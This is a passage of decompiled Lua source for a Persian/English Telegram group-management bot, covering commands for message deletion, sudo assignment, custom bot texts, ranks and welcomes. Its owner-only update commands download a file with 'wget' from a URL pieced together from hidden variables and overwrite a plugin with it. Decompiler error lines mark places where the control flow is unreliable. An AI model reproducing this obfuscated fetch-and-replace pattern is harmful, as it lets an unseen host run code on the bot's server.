                                                            -- DECOMPILER ERROR at PC8539: LeaveBlock: unexpected jumping out IF_THEN_STMT

                                                            -- DECOMPILER ERROR at PC8539: LeaveBlock: unexpected jumping out IF_STMT

                                                          end
                                                        end
                                                      end
                                                      if not lang then
                                                        return "*All Settings Group Changed to* " .. matches[2] .. " *Backup!*"
                                                      else
                                                        return "همه ی تنظیمات گروه به بک آپ " .. matches[2] .. " تغییر کردند!"
                                                      end
                                                    end
                                                  end
                                                end
                                              end
                                              do
                                                if (matches[1] == "rmsg" or matches[1] == "delmsg" or matches[1] == "حذف پیام") and ((msg.to).id):match("^-100") and is_owner(msg) then
                                                  local delmsg = function(arg, data)
    -- function num : 0_56_15 , upvalues : _ENV, cmd, delmsg
    msgs = arg.msgs
    for k,v in pairs(data.messages_) do
      msgs = msgs - 1
      ;
      (tdcli.deleteMessages)(v.chat_id_, {[0] = v.id_}, dl_cb, cmd)
      if msgs == 1 then
        (tdcli.deleteMessages)(((data.messages_)[0]).chat_id_, {[0] = ((data.messages_)[0]).id_}, dl_cb, cmd)
        return false
      end
    end
    getChatHistory(((data.messages_)[0]).chat_id_, ((data.messages_)[0]).id_, 0, 100, delmsg, {msgs = msgs})
  end

                                                  if 1000 < tonumber(matches[2]) or tonumber(matches[2]) < 1 then
                                                    if not lang then
                                                      return "*Please Use A Number Between* `1` *And* `1000`"
                                                    else
                                                      return "لطفا از یک شماره بین `1` و `1000` استفاده کنید"
                                                    end
                                                  else
                                                    ;
                                                    (_ENV.getChatHistory)((msg.to).id, msg.id, 0, 100, delmsg, {msgs = matches[2]})
                                                    if not lang then
                                                      return "`" .. tonumber(matches[2]) .. "` *Messages Were Deleted*"
                                                    else
                                                      return "`" .. tonumber(matches[2]) .. "` تا پیام حذف شدند"
                                                    end
                                                  end
                                                end
                                                if (matches[1] == "setsudo" or matches[1] == "تنظیم سودو") and is_botOwner(msg) then
                                                  if not matches[2] and msg.reply_id then
                                                    tdcli_function({ID = "GetMessage", chat_id_ = (msg.to).id, message_id_ = msg.reply_id}, action_by_reply2, {chat_id = (msg.to).id, cmd = "setsudo"})
                                                  end
                                                  if matches[2] and (string.match)(matches[2], "^%d+$") then
                                                    tdcli_function({ID = "GetUser", user_id_ = matches[2]}, action_by_id2, {chat_id = (msg.to).id, user_id = matches[2], cmd = "setsudo"})
                                                  end
                                                  if matches[2] and not (string.match)(matches[2], "^%d+$") then
                                                    tdcli_function({ID = "SearchPublicChat", username_ = matches[2]}, action_by_username2, {chat_id = (msg.to).id, username = matches[2], cmd = "setsudo"})
                                                  end
                                                end
                                                if (matches[1] == "editbot" or matches[1] == "ویرایش ربات") and is_sudo(msg) then
                                                  if not redis:sismember("SudoAccess" .. (msg.from).id, "editbot") and is_sudo(msg) and not is_botOwner(msg) then
                                                    if not lang then
                                                      return ErrorAccessSudo(msg)
                                                    else
                                                      return ErrorAccessSudo(msg)
                                                    end
                                                  else
                                                    _ENV.SettingsStrings = "`LINK`\n`TAG`\n`MENTION`\n`ARABIC`\n`EDIT`\n`SPAM`\n`FLOOD`\n`BOTS`\n`MARKDOWN`\n`WEBPAGE`\n`PIN`\n`MAXWORDS`\n`CMDS`\n`ALL`\n`GIF`\n`TEXT`\n`PHOTO`\n`VIDEO`\n`AUDIO`\n`VOICE`\n`STICKER`\n`CONTACT`\n`FORWARD`\n`LOCATION`\n`DOCUMENT`\n`TGSERVICE`\n`INLINE`\n`GAME`\n`KEYBOARD`\n`LANG`\n`NUMBEROFFLOOD`\n`NUMBEROFMAXWORDS`\n`NUMBEROFMAXWARN`\n`NUMBEROFFORCEDINVITE`\n`EXPIRE`\n`SENSE`\n`WELCOME`\n`BOTCHAT`\n`FLOODTIME`\n`FOHSH`\n`ENGLISH`\n`FORCEDINVITE`\n`USERNAME`\n`JOIN`"
                                                    if (matches[2]):lower() == "all" and (matches[3]):lower() == "help" then
                                                      return "راهنما ویرایش متن های پیشفرض:\n/editbot `NUMBER` `TEXT`\nشما میتوانید به جای TEXT از help استفاده کنید تا راهنمای هر بخش را مشاهده کنید\nعدد ها:\n*1-*`قفل شد` (EN)\n*2-*`قفل شد` (FA)\n*3-*`ارور دسترسی اعضا معمولی` (EN)\n*4-*`ارور دسترسی اعضا معمولی` (FA)\n*5-*`دستورات سودو` (�\147)\n*6-*`دستورات مالک گروه` (EN)\n*7-*`دستورات مالک گروه` (FA)\n*8-*`دستورات مدیر گروه` (EN)\n*9-*`دستورات مدیر گروه` (FA)\n*10-*`ارور دسترسی سودو` (EN)\n*11-*`ارور دسترسی سودو` (FA)\n*12-*`متن تنظیمات` (EN)\n*13-*`متن تنظیمات` (FA)\n*14-*`شکلک قفل در تنظیمات` (🔐)\n*15-*`شکلک باز بودن قفل در تنظیمات` (🔓)\n*16-*`تنظیم متن ثابت برای پایین متن ها`\n*17-*`تنظیم متن ثابت برای بالای متن ها`\n*18-*`باز یا قفل کردن آیتم ها با دو دستور`\n*19-*`تنظیم متن منشی خصوصی ربات`\n*20-*`تنظیم زمان وقفه در ارسال متن منشی`\n*21-*`تنظیم یوزرنیم کانال تیم (با @ وارد کنید)`\n*22-*`تنظیم لینک گروه پشتیبانی تیم`\n*23-*`تغییر شکلک پیشفرض متن دستورات` (�\160)\n*24-*`تغییر دستورات فارسی سودو`\n*25-*`تغییر دستورات فارسی مالک گروه`\n*26-*`تغییر دستورات فارسی مدیر گروه`\n*27-*`تنظیم زمان وقفه در اعلان تعداد اعضای دعوت شده`\n*28-*`شکلک پیشفرض دستورات فارسی (👈)`"
                                                    else
                                                      if (matches[2]):match("(%d+)") then
                                                        if matches[2] == "1" then
                                                          if (matches[3]):lower() == "help" then
                                                            return "راهنما مربوط به شماره 1: شما باید از این موارد استفاده کنید\n`NAME` نام قفل جایگزین آن میشود\n`STATUS` وضعیت قفل جایگزین آن میشود"
                                                          else
                                                            if (matches[3]):match("NAME") and (matches[3]):match("STATUS") then
                                                              (_ENV.print)(matches[3])
                                                              redis:set("EditBot:locktextEN", matches[3])
                                                              return "متن ارسالی شما جایگزین شد"
                                                            else
                                                              if matches[3] == "reset text" or matches[3] == "پیشفرض" then
                                                                redis:del("EditBot:locktextEN")
                                                                return "متن به پیشفرض خود تغییر کرد"
                                                              else
                                                                if not (matches[3]):match("NAME") or not (matches[3]):match("STATUS") then
                                                                  return "لطفا از کلمات NAME و STATUS در متن خود استفاده کنید!"
                                                                end
                                                              end
                                                            end
                                                          end
                                                        else
                                                          if matches[2] == "2" then
                                                            if (matches[3]):lower() == "help" then
                                                              return "راهنما مربوط به شماره 2: شما باید از این موارد استفاده کنید\n`NAME` نام قفل جایگزین آن میشود\n`STATUS` وضعیت قفل جایگزین آن میشود"
                                                            else
                                                              if (matches[3]):match("NAME") and (matches[3]):match("STATUS") then
                                                                redis:set("EditBot:locktextFA", matches[3])
                                                                return "متن ارسالی شما جایگزین شد"
                                                              else
                                                                if matches[3] == "reset text" or matches[3] == "پیشفرض" then
                                                                  redis:del("EditBot:locktextFA")
                                                                  return "متن به پیشفرض خود تغییر کرد"
                                                                else
                                                                  if not (matches[3]):match("NAME") or not (matches[3]):match("STATUS") then
                                                                    return "لطفا از کلمات NAME و STATUS در متن خود استفاده کنید!"
                                                                  end
                                                                end
                                                              end
                                                            end
                                                          else
                                                            if matches[2] == "3" then
                                                              if (matches[3]):lower() == "help" then
                                                                return "راهنما مربوط به شماره 3: شما میتوانید از این موارد استفاده کنید\n`USERID` آیدی عددی کاربر جایگزین آن میشود\n`GPID` آیدی گروه جایگزین آن میشود\n`USERNAME` یوزرنیم کاربر جایگزین آن میشود"
                                                              else
                                                                if matches[3] == "reset text" or matches[3] == "پیشفرض" then
                                                                  redis:del("EditBot:accessEN")
                                                                  return "متن به پیشفرض خود تغییر کرد"
                                                                else
                                                                  redis:set("EditBot:accessEN", matches[3])
                                                                  return "متن ارسالی شما جایگزین شد"
                                                                end
                                                              end
                                                            else
                                                              if matches[2] == "4" then
                                                                if (matches[3]):lower() == "help" then
                                                                  return "راهنما مربوط به شماره 4: شما میتوانید از این موارد استفاده کنید\n`USERID` آیدی عددی کاربر جایگزین آن میشود\n`GPID` آیدی گروه جایگزین آن میشود\n`USERNAME` یوزرنیم کاربر جایگزین آن میشود"
                                                                else
                                                                  if matches[3] == "reset text" or matches[3] == "پیشفرض" then
                                                                    redis:del("EditBot:accessFA")
                                                                    return "متن به پیشفرض خود تغییر کرد"
                                                                  else
                                                                    redis:set("EditBot:accessFA", matches[3])
                                                                    return "متن ارسالی شما جایگزین شد"
                                                                  end
                                                                end
                                                              else
                                                                if matches[2] == "5" then
                                                                  if (matches[3]):lower() == "help" then
                                                                    return "شماره وارد شده راهنما ندارد!"
                                                                  else
                                                                    if matches[3] == "reset text" or matches[3] == "پیشفرض" then
                                                                      redis:del("EditBot:helpsudo")
                                                                      return "متن به پیشفرض خود تغییر کرد"
                                                                    else
                                                                      redis:set("EditBot:helpsudo", matches[3])
                                                                      return "متن ارسالی شما جایگزین شد"
                                                                    end
                                                                  end
                                                                else
                                                                  if matches[2] == "6" then
                                                                    if (matches[3]):lower() == "help" then
                                                                      return "شماره وارد شده راهنما ندارد!"
                                                                    else
                                                                      if matches[3] == "reset text" or matches[3] == "پیشفرض" then
                                                                        redis:del("EditBot:helpownerEN")
                                                                        return "متن به پیشفرض خود تغییر کرد"
                                                                      else
                                                                        redis:set("EditBot:helpownerEN", matches[3])
                                                                        return "متن ارسالی شما جایگزین شد"
                                                                      end
                                                                    end
                                                                  else
                                                                    if matches[2] == "7" then
                                                                      if (matches[3]):lower() == "help" then
                                                                        return "شماره وارد شده راهنما ندارد!"
                                                                      else
                                                                        if matches[3] == "reset text" or matches[3] == "پیشفرض" then
                                                                          redis:del("EditBot:helpownerFA")
                                                                          return "متن به پیشفرض خود تغییر کرد"
                                                                        else
                                                                          redis:set("EditBot:helpownerFA", matches[3])
                                                                          return "متن ارسالی شما جایگزین شد"
                                                                        end
                                                                      end
                                                                    else
                                                                      if matches[2] == "8" then
                                                                        if (matches[3]):lower() == "help" then
                                                                          return "شماره وارد شده راهنما ندارد!"
                                                                        else
                                                                          if matches[3] == "reset text" or matches[3] == "پیشفرض" then
                                                                            redis:del("EditBot:helpmodEN")
                                                                            return "متن به پیشفرض خود تغییر کرد"
                                                                          else
                                                                            redis:set("EditBot:helpmodEN", matches[3])
                                                                            return "متن ارسالی شما جایگزین شد"
                                                                          end
                                                                        end
                                                                      else
                                                                        if matches[2] == "9" then
                                                                          if (matches[3]):lower() == "help" then
                                                                            return "شماره وارد شده راهنما ندارد!"
                                                                          else
                                                                            if matches[3] == "reset text" or matches[3] == "پیشفرض" then
                                                                              redis:del("EditBot:helpmodFA")
                                                                              return "متن به پیشفرض خود تغییر کرد"
                                                                            else
                                                                              redis:set("EditBot:helpmodFA", matches[3])
                                                                              return "متن ارسالی شما جایگزین شد"
                                                                            end
                                                                          end
                                                                        else
                                                                          if matches[2] == "10" then
                                                                            if (matches[3]):lower() == "help" then
                                                                              return "راهنما مربوط به شماره 10: شما میتوانید از این موارد استفاده کنید\n`USERID` آیدی عددی کاربر جایگزین آن میشود\n`GPID` آیدی گروه جایگزین آن میشود\n`USERNAME` یوزرنیم کاربر جایگزین آن میشود"
                                                                            else
                                                                              if matches[3] == "reset text" or matches[3] == "پیشفرض" then
                                                                                redis:del("EditBot:errorsudoaccessEN")
                                                                                return "متن به پیشفرض خود تغییر کرد"
                                                                              else
                                                                                redis:set("EditBot:errorsudoaccessEN", matches[3])
                                                                                return "متن ارسالی شما جایگزین شد"
                                                                              end
                                                                            end
                                                                          else
                                                                            if matches[2] == "11" then
                                                                              if (matches[3]):lower() == "help" then
                                                                                return "راهنما مربوط به شماره 11: شما میتوانید از این موارد استفاده کنید\n`USERID` آیدی عددی کاربر جایگزین آن میشود\n`GPID` آیدی گروه جایگزین آن میشود\n`USERNAME` یوزرنیم کاربر جایگزین آن میشود"
                                                                              else
                                                                                if matches[3] == "reset text" or matches[3] == "پیشفرض" then
                                                                                  redis:del("EditBot:errorsudoaccessFA")
                                                                                  return "متن به پیشفرض خود تغییر کرد"
                                                                                else
                                                                                  redis:set("EditBot:errorsudoaccessFA", matches[3])
                                                                                  return "متن ارسالی شما جایگزین شد"
                                                                                end
                                                                              end
                                                                            else
                                                                              if matches[2] == "12" then
                                                                                if (matches[3]):lower() == "help" then
                                                                                  return "راهنما مربوط به شماره 12: شما میتوانید از این موارد استفاده کنید\n" .. _ENV.SettingsStrings
                                                                                else
                                                                                  if matches[3] == "reset text" or matches[3] == "پیشفرض" then
                                                                                    redis:del("EditBot:settingsEN")
                                                                                    return "متن به پیشفرض خود تغییر کرد"
                                                                                  else
                                                                                    redis:set("EditBot:settingsEN", matches[3])
                                                                                    return "متن ارسالی شما جایگزین شد"
                                                                                  end
                                                                                end
                                                                              else
                                                                                if matches[2] == "13" then
                                                                                  if (matches[3]):lower() == "help" then
                                                                                    return "راهنما مربوط به شماره 13: شما میتوانید از این موارد استفاده کنید\n" .. _ENV.SettingsStrings
                                                                                  else
                                                                                    if matches[3] == "reset text" or matches[3] == "پیشفرض" then
                                                                                      redis:del("EditBot:settingsFA")
                                                                                      return "متن به پیشفرض خود تغییر کرد"
                                                                                    else
                                                                                      redis:set("EditBot:settingsFA", matches[3])
                                                                                      return "متن ارسالی شما جایگزین شد"
                                                                                    end
                                                                                  end
                                                                                else
                                                                                  if matches[2] == "14" then
                                                                                    if (matches[3]):lower() == "help" then
                                                                                      return "شماره وارد شده راهنما ندارد!"
                                                                                    else
                                                                                      if matches[3] == "reset text" or matches[3] == "پیشفرض" then
                                                                                        redis:del("EditBot:lockemoji")
                                                                                        return "متن به پیشفرض خود تغییر کرد"
                                                                                      else
                                                                                        redis:set("EditBot:lockemoji", matches[3])
                                                                                        return "متن ارسالی شما جایگزین شد"
                                                                                      end
                                                                                    end
                                                                                  else
                                                                                    if matches[2] == "15" then
                                                                                      if (matches[3]):lower() == "help" then
                                                                                        return "شماره وارد شده راهنما ندارد!"
                                                                                      else
                                                                                        if matches[3] == "reset text" or matches[3] == "پیشفرض" then
                                                                                          redis:del("EditBot:unlockemoji")
                                                                                          return "متن به پیشفرض خود تغییر کرد"
                                                                                        else
                                                                                          redis:set("EditBot:unlockemoji", matches[3])
                                                                                          return "متن ارسالی شما جایگزین شد"
                                                                                        end
                                                                                      end
                                                                                    else
                                                                                      if matches[2] == "16" then
                                                                                        if (matches[3]):lower() == "help" then
                                                                                          return "شماره وارد شده راهنما ندارد!"
                                                                                        else
                                                                                          if matches[3] == "reset text" or matches[3] == "پیشفرض" then
                                                                                            redis:del("EditBot:textmessages")
                                                                                            return "متن به پیشفرض خود تغییر کرد"
                                                                                          else
                                                                                            redis:set("EditBot:textmessages", matches[3])
                                                                                            return "متن ارسالی شما جایگزین شد"
                                                                                          end
                                                                                        end
                                                                                      else
                                                                                        if matches[2] == "17" then
                                                                                          if (matches[3]):lower() == "help" then
                                                                                            return "شماره وارد شده راهنما ندارد!"
                                                                                          else
                                                                                            if matches[3] == "reset text" or matches[3] == "پیشفرض" then
                                                                                              redis:del("EditBot:uptextmessages")
                                                                                              return "متن به پیشفرض خود تغییر کرد"
                                                                                            else
                                                                                              redis:set("EditBot:uptextmessages", matches[3])
                                                                                              return "متن ارسالی شما جایگزین شد"
                                                                                            end
                                                                                          end
                                                                                        else
                                                                                          if matches[2] == "18" then
                                                                                            if (matches[3]):lower() == "help" then
                                                                                              return "راهنما مربوط به شماره 18:\nبرای روشن کردن این قابلیت از کلمه `on` استفاده کنید\nو برای خاموش کردن این قابلیت از کلمه `off` استفاده کنید"
                                                                                            else
                                                                                              if matches[3] == "on" or matches[3] == "روشن" then
                                                                                                redis:set("EditBot:lockandunlock", true)
                                                                                                return "روشن شد"
                                                                                              else
                                                                                                if matches[3] == "off" or matches[3] == "خاموش" then
                                                                                                  redis:del("EditBot:lockandunlock")
                                                                                                  return "خاموش شد"
                                                                                                end
                                                                                              end
                                                                                            end
                                                                                          else
                                                                                            if matches[2] == "19" then
                                                                                              if (matches[3]):lower() == "help" then
                                                                                                return "راهنما مربوط به شماره 19:\nبا تنظیم کردن متن برای این شماره منشی خودکار روشن خواهد شد و اگر متن تنظیم شده را به off تغییر دهید منشی خاموش خواهد شد"
                                                                                              else
                                                                                                if matches[3] == "off" or matches[3] == "خاموش" then
                                                                                                  redis:del("EditBot:botmonshi")
                                                                                                  return "منشی ربات خاموش شد"
                                                                                                else
                                                                                                  redis:set("EditBot:botmonshi", matches[3])
                                                                                                  return "متن ارسالی شما جایگزین شد"
                                                                                                end
                                                                                              end
                                                                                            else
                                                                                              if matches[2] == "20" then
                                                                                                if (matches[3]):lower() == "help" then
                                                                                                  return "راهنما مربوط به شماره 20:\nزمان را به دقیقه وارد کنید"
                                                                                                else
                                                                                                  if (string.match)(matches[3], "(%d+)") then
                                                                                                    redis:set("EditBot:botmonshitime", tonumber(matches[3]))
                                                                                                    return "زمان ارسالی شما جایگزین شد"
                                                                                                  end
                                                                                                end
                                                                                              else
                                                                                                if matches[2] == "21" then
                                                                                                  if (matches[3]):lower() == "help" then
                                                                                                    return "راهنما مربوط به شماره 21:\nبرای ثبت کانال یوزرنیم آن را با @ بفرستید یا برای خاموش کردن این قابلیت از کلمه off استفاده کنید"
                                                                                                  else
                                                                                                    if (matches[3]):lower() == "off" or matches[3] == "خاموش" then
                                                                                                      redis:del("EditBot:botchannel")
                                                                                                      return "خاموش شد"
                                                                                                    else
                                                                                                      if (string.match)(matches[3], "(@.*)") then
                                                                                                        redis:set("EditBot:botchannel", matches[3])
                                                                                                        return "کانال ثبت شد"
                                                                                                      end
                                                                                                    end
                                                                                                  end
                                                                                                else
                                                                                                  if matches[2] == "22" then
                                                                                                    if (matches[3]):lower() == "help" then
                                                                                                      return "شماره وارد شده راهنما ندارد!"
                                                                                                    else
                                                                                                      redis:set("EditBot:supportgp", matches[3])
                                                                                                      return "گروه پشتیبانی ثبت شد"
                                                                                                    end
                                                                                                  else
                                                                                                    if matches[2] == "23" then
                                                                                                      if (matches[3]):lower() == "help" then
                                                                                                        return "شماره وارد شده راهنما ندارد!"
                                                                                                      else
                                                                                                        if (matches[3]):lower() == "reset text" or matches[3] == "پیشفرض" then
                                                                                                          redis:del("EditBot:cmdsemoji")
                                                                                                          return "متن به پیشفرض خود تغییر کرد"
                                                                                                        else
                                                                                                          redis:set("EditBot:cmdsemoji", matches[3])
                                                                                                          return "متن ارسالی شما جایگزین شد"
                                                                                                        end
                                                                                                      end
                                                                                                    else
                                                                                                      if matches[2] == "24" then
                                                                                                        if (matches[3]):lower() == "help" then
                                                                                                          return "راهنما مربوط به شماره 24:\nبرای تغییر به پیشفرض از reset text استفاده کنید و برای استفاده از شکلک ثبت شده از کلمه EMJ استفاده کنید"
                                                                                                        else
                                                                                                          if (matches[3]):lower() == "reset text" or matches[3] == "پیشفرض" then
                                                                                                            redis:del("EditBot:fahelpsudo")
                                                                                                            return "متن به پیشفرض خود تغییر کرد"
                                                                                                          else
                                                                                                            redis:set("EditBot:fahelpsudo", matches[3])
                                                                                                            return "متن ارسالی شما جایگزین شد"
                                                                                                          end
                                                                                                        end
                                                                                                      else
                                                                                                        if matches[2] == "25" then
                                                                                                          if (matches[3]):lower() == "help" then
                                                                                                            return "راهنما مربوط به شماره 25:\nبرای تغییر به پیشفرض از reset text استفاده کنید و برای استفاده از شکلک ثبت شده از کلمه EMJ استفاده کنید"
                                                                                                          else
                                                                                                            if (matches[3]):lower() == "reset text" or matches[3] == "پیشفرض" then
                                                                                                              redis:del("EditBot:fahelpowner")
                                                                                                              return "متن به پیشفرض خود تغییر کرد"
                                                                                                            else
                                                                                                              redis:set("EditBot:fahelpowner", matches[3])
                                                                                                              return "متن ارسالی شما جایگزین شد"
                                                                                                            end
                                                                                                          end
                                                                                                        else
                                                                                                          if matches[2] == "26" then
                                                                                                            if (matches[3]):lower() == "help" then
                                                                                                              return "راهنما مربوط به شماره 26:\nبرای تغییر به پیشفرض از reset text استفاده کنید و برای استفاده از شکلک ثبت شده از کلمه EMJ استفاده کنید"
                                                                                                            else
                                                                                                              if (matches[3]):lower() == "reset text" or matches[3] == "پیشفرض" then
                                                                                                                redis:del("EditBot:fahelpmods")
                                                                                                                return "متن به پیشفرض خود تغییر کرد"
                                                                                                              else
                                                                                                                redis:set("EditBot:fahelpmods", matches[3])
                                                                                                                return "متن ارسالی شما جایگزین شد"
                                                                                                              end
                                                                                                            end
                                                                                                          else
                                                                                                            if matches[2] == "27" then
                                                                                                              if (matches[3]):lower() == "help" then
                                                                                                                return "راهنما مربوط به شماره 27:\nزمان را به دقیقه وارد کنید"
                                                                                                              else
                                                                                                                if (string.match)(matches[3], "(%d+)") then
                                                                                                                  redis:set("EditBot:timeinviter", tonumber(matches[3]))
                                                                                                                  return "زمان ارسالی شما جایگزین شد"
                                                                                                                end
                                                                                                              end
                                                                                                            else
                                                                                                              if matches[2] == "28" then
                                                                                                                if (matches[3]):lower() == "help" then
                                                                                                                  return "شماره وارد شده راهنما ندارد!"
                                                                                                                else
                                                                                                                  if (matches[3]):lower() == "reset text" or matches[3] == "پیشفرض" then
                                                                                                                    redis:del("EditBot:facmdsemoji")
                                                                                                                    return "متن به پیشفرض خود تغییر کرد"
                                                                                                                  else
                                                                                                                    redis:set("EditBot:facmdsemoji", matches[3])
                                                                                                                    return "متن ارسالی شما جایگزین شد"
                                                                                                                  end
                                                                                                                end
                                                                                                              end
                                                                                                            end
                                                                                                          end
                                                                                                        end
                                                                                                      end
                                                                                                    end
                                                                                                  end
                                                                                                end
                                                                                              end
                                                                                            end
                                                                                          end
                                                                                        end
                                                                                      end
                                                                                    end
                                                                                  end
                                                                                end
                                                                              end
                                                                            end
                                                                          end
                                                                        end
                                                                      end
                                                                    end
                                                                  end
                                                                end
                                                              end
                                                            end
                                                          end
                                                        end
                                                      end
                                                    end
                                                  end
                                                end
                                                if (matches[1] == "setrank" or matches[1] == "تنظیم رنک") and is_owner(msg) then
                                                  _ENV.SetRank = function(extra, result, success)
    -- function num : 0_56_16 , upvalues : user, chat, _ENV, matches, lang
    user = result.sender_user_id_
    chat = result.chat_id_
    redis:set("GetRankForUser:" .. user .. ":" .. chat, matches[2])
    print("User: " .. user .. "\nChat: " .. chat .. "\nRank: " .. matches[2])
    if not lang then
      (tdcli.sendMessage)(chat, 0, 0, "*Users* " .. user .. " *Rank Has Been Set To:* " .. matches[2], 0, "md")
    else
      ;
      (tdcli.sendMessage)(chat, 0, 0, "رنک کاربر " .. user .. " تنظیم شد به: " .. matches[2], 0, "md")
    end
  end

                                                  tdcli_function({ID = "GetMessage", chat_id_ = (msg.to).id, message_id_ = msg.reply_to_message_id_}, _ENV.SetRank, nil)
                                                end
                                                if (matches[1] == "manager" or matches[1] == "مدیریت") and is_mod(msg) then
                                                  _ENV.GetManager = function(msg)
    -- function num : 0_56_17 , upvalues : _ENV, lang
    GetHelper = function(arg, data)
      -- function num : 0_56_17_0 , upvalues : _ENV, msg, lang
      local inline_query_cb = function(arg, data)
        -- function num : 0_56_17_0_0 , upvalues : _ENV, msg, lang
        if data.results_ and (data.results_)[0] then
          (tdcli.sendInlineQueryResultMessage)((msg.to).id, 0, 0, 1, data.inline_query_id_, ((data.results_)[0]).id_, dl_cb, nil)
        else
          if not lang then
            text = "`Helper Bot is not online!`"
          else
            if lang then
              text = "`ربات کمکی روشن نیست!`"
            end
          end
          return (tdcli.sendMessage)((msg.to).id, msg.id, 0, text, 0, "md")
        end
      end

      ;
      (tdcli.getInlineQueryResults)(data.id_, (msg.to).id, 0, 0, (msg.to).id, 0, inline_query_cb, nil)
    end

    ;
    (tdcli.searchPublicChat)(_config.Helper, GetHelper, nil)
  end

                                                  if redis:get("EditBot:botchannel") then
                                                    local channel = redis:get("EditBot:botchannel")
                                                    _ENV.https = (_ENV.require)("ssl.https")
                                                    local url, res = ((_ENV.https).request)("https://api.telegram.org/bot" .. (_ENV._config).Token .. "/getchatmember?chat_id=" .. channel .. "&user_id=" .. (msg.from).id)
                                                    data = (_ENV.json):decode(url)
                                                    if data.description == "Bad Request: CHAT_ADMIN_REQUIRED" then
                                                      if not lang then
                                                        return "Helper Bot is Not Channel Admin!"
                                                      else
                                                        return "ربات کمکی مدیر کانال نیست!"
                                                      end
                                                    else
                                                      if res ~= 200 or (data.result).status == "left" or (data.result).status == "kicked" then
                                                        if not lang then
                                                          return "Please First Join To " .. (_ENV.check_markdown)(channel) .. " Channel And Then Use This Commands!"
                                                        else
                                                          return "لطفا ابتدا وارد کانال " .. (_ENV.check_markdown)(channel) .. " شوید و بعد از عضویت از این دستور استفاده کنید!"
                                                        end
                                                      else
                                                        if data.ok then
                                                          (_ENV.GetManager)(msg)
                                                        end
                                                      end
                                                    end
                                                  else
                                                    do
                                                      ;
                                                      (_ENV.GetManager)(msg)
                                                      if (matches[1] == "welcome" or matches[1] == "خوش آمد گویی") and is_mod(msg) then
                                                        if matches[2] == "enable" or matches[2] == "on" or matches[2] == "روشن" then
                                                          _ENV.welcome = redis:get("SettingsWelcomeFor" .. (msg.to).id)
                                                          if _ENV.welcome then
                                                            if not lang then
                                                              return "*Group welcome* \n*Status:* `Already Enabled`"
                                                            else
                                                              if lang then
                                                                return "*خوش آمد گویی گروه* \n*وضعیت:* `هم اکنون فعال می باشد`"
                                                              end
                                                            end
                                                          else
                                                            redis:set("SettingsWelcomeFor" .. (msg.to).id, true)
                                                            if not lang then
                                                              return "*Group welcome* \n*Status:* `Enabled`"
                                                            else
                                                              if lang then
                                                                return "*خوش آمد گویی گروه* \n*وضعیت:* `فعال شد`"
                                                              end
                                                            end
                                                          end
                                                        end
                                                        if matches[2] == "disable" or matches[2] == "off" or matches[2] == "خاموش" then
                                                          _ENV.welcome = redis:get("SettingsWelcomeFor" .. (msg.to).id)
                                                          if not _ENV.welcome then
                                                            if not lang then
                                                              return "*Group Welcome* \n*Status:* `Not Enabled`"
                                                            else
                                                              if lang then
                                                                return "*خوش آمد گویی گروه* \n*وضعیت:* `فعال نیست`"
                                                              end
                                                            end
                                                          else
                                                            redis:del("SettingsWelcomeFor" .. (msg.to).id)
                                                            if not lang then
                                                              return "*Group welcome* \n*Status:* `Disabled`"
                                                            else
                                                              if lang then
                                                                return "*خوش آمد گویی گروه* \n*وضعیت:* `غیر فعال شد`"
                                                              end
                                                            end
                                                          end
                                                        end
                                                      end
                                                      if (matches[1] == "setwelcome" or matches[1] == "تنظیم خوش آمد گویی") and is_mod(msg) then
                                                        _ENV.Wlc = (_ENV.check_markdown)(matches[2])
                                                        redis:set("GroupWelcome" .. (msg.to).id, _ENV.Wlc)
                                                        if not lang then
                                                          (tdcli.sendMessage)(msg.chat_id_, 0, 1, "Group welcome has been changed to:\n" .. _ENV.Wlc, 1)
                                                        else
                                                          ;
                                                          (tdcli.sendMessage)(msg.chat_id_, 0, 1, "خوش آمد گويي گروه تغيير کرد به:\n" .. _ENV.Wlc, 1)
                                                        end
                                                      end
                                                      if ((matches[1]):lower() == "checkupdate" or matches[1] == "چک آپدیت") and is_botOwner(msg) then
                                                        _ENV.url = ((_ENV.http).request)(_ENV.h0i .. "" .. _ENV.h0ii .. "" .. _ENV.h0iii .. "" .. _ENV.h0iiii .. "updates/ver" .. _ENV.JFormat)
                                                        data = (_ENV.json):decode(_ENV.url)
                                                        _ENV.ver = tonumber(data.verid)
                                                        _ENV.verRedis = tonumber(redis:get("CheckVersionID"))
                                                        if _ENV.verRedis < _ENV.ver then
                                                          (tdcli.sendMessage)(msg.chat_id_, msg.id_, 1, "`لطفا صبر کنید...`", 1, "md")
                                                          local FileUpdate = "file-update"
                                                          ;
                                                          (((_ENV.io).popen)("wget " .. _ENV.h0i .. "" .. _ENV.h0ii .. "" .. _ENV.h0iii .. "" .. _ENV.h0iiii .. "updates/" .. FileUpdate .. " && mv " .. FileUpdate .. " advan.lua")):read("*all")
                                                          ;
                                                          (tdcli.sendMessage)(msg.chat_id_, 0, 1, "`آپدیت تمام شد!`\nورژن قبل: `" .. redis:get("CheckVersion") .. "`\nورژن جدید: `" .. data.version .. "`\nتغییرات:\n" .. data.changes, 1, "md")
                                                          redis:set("CheckVersion", data.version)
                                                          redis:set("CheckVersionID", data.verid)
                                                          _ENV.plugins = {}
                                                          ;
                                                          (_ENV.load_plugins)()
                                                        else
                                                          do
                                                            if _ENV.ver == _ENV.verRedis then
                                                              if not lang then
                                                                return "*Source is Updated!*\nVersion: `" .. redis:get("CheckVersion") .. "`"
                                                              else
                                                                return "*سورس آپدیت می باشد!*\nورژن: `" .. redis:get("CheckVersion") .. "`"
                                                              end
                                                            end
                                                            if (matches[1]):lower() == "forceupdate" and is_botOwner(msg) then
                                                              (tdcli.sendMessage)(msg.chat_id_, msg.id_, 1, "`لطفا صبر کنید...`", 1, "md")
                                                              local FileUpdate = "file-update"
                                                              ;
                                                              (((_ENV.io).popen)("wget " .. _ENV.h0i .. "" .. _ENV.h0ii .. "" .. _ENV.h0iii .. "" .. _ENV.h0iiii .. "updates/" .. FileUpdate .. " && mv " .. FileUpdate .. " advan.lua")):read("*all")
                                                              ;
                                                              (tdcli.sendMessage)(msg.chat_id_, 0, 1, "آخرین آپدیت دریافت شد", 1, "md")
                                                              _ENV.plugins = {}
                                                              ;
                                                              (_ENV.load_plugins)()
                                                            end
                                                            do
                                                              local userid = tonumber(matches[2])
                                                              local hash = "gp_lang:" .. (msg.to).id
                                                              local lang = redis:get(hash)
                                                              local data = load_data("./data/moderation.json")
                                                              chat = (msg.to).id
                                                              user = (msg.from).id
                                                              if (msg.to).type ~= "pv" then
                                                                if (matches[1] == "kick" or matches[1] == "اخراج") and is_mod(msg) then
                                                                  if not matches[2] and msg.reply_id then
